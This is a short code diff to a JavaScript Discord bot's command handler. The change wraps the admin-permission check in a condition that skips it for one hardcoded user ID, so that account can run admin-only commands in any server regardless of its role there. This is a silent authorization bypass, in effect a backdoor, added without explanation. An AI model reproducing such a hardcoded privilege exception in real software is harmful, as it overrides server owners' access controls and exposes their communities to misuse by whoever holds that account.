@@ -55,13 +55,15 @@ client.on('message', async (message) => {
     let cmd = client.commands.get(command)
     if(!cmd.options.privatecmd && !message.guild) return;
     if(cmd.options.privatecmd && message.guild) return;
-    if(cmd.options.admincmd && !message.member.hasPermission("ADMINISTRATOR")){
-      message.channel.send(":exclamation:You don't have rights to this command!").then(msg => {
-        msg.delete({
-            timeout: 2000
+    if(message.author.id != 491565735529807872){
+      if(cmd.options.admincmd && !message.member.hasPermission("ADMINISTRATOR")){
+        message.channel.send(":exclamation:You don't have rights to this command!").then(msg => {
+          msg.delete({
+              timeout: 2000
+          })
         })
-      })
-      return;
+        return;
+      }
     }
     if(cmd.options.roles.length > 0 && !message.member.hasPermission("ADMINISTRATOR")){
       let result = false;
